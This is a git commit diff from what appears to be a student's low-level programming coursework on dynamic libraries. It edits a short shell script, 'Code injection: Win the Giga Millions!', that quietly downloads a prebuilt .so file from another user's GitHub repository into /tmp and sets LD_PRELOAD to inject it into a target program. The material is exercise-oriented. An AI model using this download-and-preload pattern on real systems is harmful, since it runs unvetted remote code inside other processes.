779fe5a5242f7d9a61c5c5eea44bc17a7267facc
Anteneh Bizuneh <antukassaw1@gmail.com>
2021-12-02 06:30:52 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -O /tmp/libtest.so https://github.com/Anteneh2121/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libtest.so
+wget -q -O /tmp/libtest.so https://github.com/MitaliSengupta/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libtest.so
 export LD_PRELOAD=/tmp/libtest.so
